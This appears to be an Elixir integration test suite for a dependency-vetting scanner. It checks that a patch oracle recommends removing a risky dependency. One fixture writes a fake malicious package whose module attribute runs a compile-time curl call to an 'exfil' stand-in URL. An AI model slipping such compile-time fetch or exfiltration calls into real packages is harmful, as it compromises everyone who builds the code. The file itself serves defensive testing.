defmodule VetCore.Integration.PatchOracleScannerIntegrationTest do
  @moduledoc """
  Integration tests for the PatchOracle wiring in the scanner.

  The scanner only populates `DependencyReport.patches` when `opts[:patches]`
  is truthy — the oracle is off by default because the optional
  `verify_patches` hits hex.pm. These tests pin:

    * default: `patches == []` on every dep report
    * `patches: true, verify_patches: false`: oracle fires and fills patches
    * compile-time critical system_exec on a hex dep → remove_dependency patch
    * clean dep → patches stays empty even when oracle runs
  """

  use ExUnit.Case, async: true

  setup do
    tmp =
      Path.join(
        System.tmp_dir!(),
        "vet_patch_oracle_integration_#{System.unique_integer([:positive])}"
      )

    File.mkdir_p!(tmp)
    on_exit(fn -> File.rm_rf!(tmp) end)

    # A dep with compile-time System.cmd — the canonical "rip it out" case.
    dep_dir = Path.join([tmp, "deps", "compile_time_evil", "lib"])
    File.mkdir_p!(dep_dir)

    File.write!(Path.join(dep_dir, "evil.ex"), ~S"""
    defmodule Evil do
      @payload System.cmd("curl", ["https://example.test/exfil"])
    end
    """)

    File.write!(Path.join([tmp, "deps", "compile_time_evil", "mix.exs"]), ~S"""
    defmodule CompileTimeEvil.MixProject do
      use Mix.Project
      def project, do: [app: :compile_time_evil, version: "0.1.0"]
    end
    """)

    # A clean dep to confirm patches stay [] when there's nothing to fix.
    clean_dir = Path.join([tmp, "deps", "clean_pkg", "lib"])
    File.mkdir_p!(clean_dir)

    File.write!(Path.join(clean_dir, "clean.ex"), ~S"""
    defmodule CleanPkg do
      def hello, do: :world
    end
    """)

    File.write!(Path.join([tmp, "deps", "clean_pkg", "mix.exs"]), ~S"""
    defmodule CleanPkg.MixProject do
      use Mix.Project
      def project, do: [app: :clean_pkg, version: "1.0.0"]
    end
    """)

    File.write!(
      Path.join(tmp, "mix.lock"),
      ~s(%{\n  "compile_time_evil": {:hex, :compile_time_evil, "0.1.0", "a", [:mix], [], "hexpm", "b"},\n  "clean_pkg": {:hex, :clean_pkg, "1.0.0", "c", [:mix], [], "hexpm", "d"},\n})
    )

    %{project_path: tmp}
  end

  describe "patches field defaults" do
    test "with no :patches option, every dep report has patches: []", %{project_path: path} do
      {:ok, report} = VetCore.scan(path, skip_hex: true, skip_history: true)

      for dr <- report.dependency_reports do
        assert dr.patches == [],
               "expected patches: [] for #{dr.dependency.name}, got #{inspect(dr.patches)}"
      end
    end

    test "with patches: false explicitly, patches stays []", %{project_path: path} do
      {:ok, report} = VetCore.scan(path, skip_hex: true, skip_history: true, patches: false)

      for dr <- report.dependency_reports do
        assert dr.patches == []
      end
    end
  end

  describe "patches field populated under opts[:patches]" do
    test "compile-time critical dep gets a remove_dependency patch", %{project_path: path} do
      {:ok, report} =
        VetCore.scan(path,
          skip_hex: true,
          skip_history: true,
          patches: true,
          verify_patches: false
        )

      evil =
        Enum.find(report.dependency_reports, fn dr ->
          dr.dependency.name == :compile_time_evil
        end)

      assert evil != nil

      # Expect exactly one removal patch for the compile-time System.cmd.
      removal_patches = Enum.filter(evil.patches, &(&1.action == :remove_dependency))
      assert length(removal_patches) >= 1

      [patch | _] = removal_patches
      assert patch.target == nil
      assert patch.source_finding_category == :system_exec
      assert patch.rationale =~ "compile-time" or patch.rationale =~ "Compile-time"
      assert patch.diff =~ "compile_time_evil"
    end

    test "a clean dep never gets patches even when oracle is on", %{project_path: path} do
      {:ok, report} =
        VetCore.scan(path,
          skip_hex: true,
          skip_history: true,
          patches: true,
          verify_patches: false
        )

      clean =
        Enum.find(report.dependency_reports, fn dr ->
          dr.dependency.name == :clean_pkg
        end)

      assert clean != nil
      assert clean.patches == []
    end

    test "patches is a list of maps (the schema PatchOracle documents)", %{project_path: path} do
      {:ok, report} =
        VetCore.scan(path,
          skip_hex: true,
          skip_history: true,
          patches: true,
          verify_patches: false
        )

      evil = Enum.find(report.dependency_reports, &(&1.dependency.name == :compile_time_evil))

      for patch <- evil.patches do
        assert is_map(patch)
        assert Map.has_key?(patch, :action)
        assert Map.has_key?(patch, :rationale)
        assert Map.has_key?(patch, :diff)
        assert Map.has_key?(patch, :source_finding_category)
      end
    end

    test "verify_patches: false leaves verified? nil for rename patches", %{project_path: path} do
      # This dep has no phantom/typosquat findings, so rename patches may
      # not appear; the invariant we actually check is that WHEN a patch
      # would normally verify, we skip it here.
      {:ok, report} =
        VetCore.scan(path,
          skip_hex: true,
          skip_history: true,
          patches: true,
          verify_patches: false
        )

      all_patches =
        report.dependency_reports
        |> Enum.flat_map(& &1.patches)

      # Any rename_package patch should have verified? == nil (skipped).
      for %{action: action, verified?: verified} = p <- all_patches, action == :rename_package do
        assert verified == nil, "expected unverified rename, got #{inspect(p)}"
      end
    end
  end

  describe "scan report is well-formed regardless of patches option" do
    test "enabling patches does not drop findings or change risk scoring", %{project_path: path} do
      {:ok, without} = VetCore.scan(path, skip_hex: true, skip_history: true)

      {:ok, with_patches} =
        VetCore.scan(path,
          skip_hex: true,
          skip_history: true,
          patches: true,
          verify_patches: false
        )

      # Scores and findings should be identical — patches attach alongside.
      for {a, b} <- Enum.zip(without.dependency_reports, with_patches.dependency_reports) do
        assert a.dependency.name == b.dependency.name
        assert a.risk_score == b.risk_score
        assert a.risk_level == b.risk_level
        assert length(a.findings) == length(b.findings)
      end
    end
  end
end
